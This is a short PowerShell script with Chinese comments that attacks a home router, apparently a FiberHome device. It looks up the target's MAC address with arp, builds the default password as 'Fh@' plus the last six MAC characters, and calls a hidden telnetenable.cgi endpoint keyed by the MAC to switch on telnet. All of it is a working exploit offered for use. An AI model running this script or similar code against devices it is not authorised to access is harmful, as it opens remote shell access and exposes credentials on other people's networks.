# 步骤1: 执行 arp -a 命令并将输出保存到临时文件中
$targetIP = Read-Host "请输入目标IP地址"
Write-Output $targetIP
$tempFilePath = Join-Path $PSScriptRoot "arp_output.txt"

Invoke-Expression "arp -a" | Out-File -FilePath $tempFilePath

# 步骤2: 从输出文件中找到192.168.1.1对应的MAC地址
$macAddressLine = Get-Content -Path $tempFilePath | Select-String -Pattern "$targetIP\s+([0-9a-fA-F:]+)"

# 检查是否找到目标IP的MAC地址
if ($null -eq $macAddressLine) {
    Write-Host "未找到192.168.1.1的MAC地址"
} else {
    # 提取MAC地址部分，去除前缀的IP地址和空格
    $macAddress = $macAddressLine.Line -replace "$targetIP\s+", ""
    $macAddress = $macAddress -replace " 动态", ""
    $macAddress = $macAddress -replace "  ", ""

    # 处理冒号问题：确保每个字节为两个字符，并移除所有非必要的内容
    $fixedMacAddress = ""
    foreach ($segment in $macAddress.Split('-')) {
        if ($segment.Length -eq 1) {
            # 在单个字符前补0
            $fixedMacAddress += "0$segment"
        } else {
            $fixedMacAddress += $segment
        }
    }

# 将所有字母转换为大写，并移除所有的冒号
$finalMacAddress = $fixedMacAddress.ToUpper() -replace "-", ""
$password = "Fh@$($finalMacAddress.Substring(($finalMacAddress.Length - 6), 6))"
Write-Host "最终的MAC地址是: $finalMacAddress, 密码是: $password"
# 步骤3: 构造URL并发送请求
$url = "http://$targetIP/cgi-bin/telnetenable.cgi?telnetenable=1&key=$finalMacAddress"
Write-Host "$url"
# 使用curl命令发送GET请求
$response = Invoke-WebRequest -Uri $url -Method Get
# Write-Host "请求结果： $($response.Content)"
$match = [regex]::Match($response.Content, "document\.writeln\s*\(\s*\'([^\']*)\'\s*\)")
Write-Output $message
if ($match.Success) {
    $message = $match.Groups[1].Value
    Write-Output $message
    }
}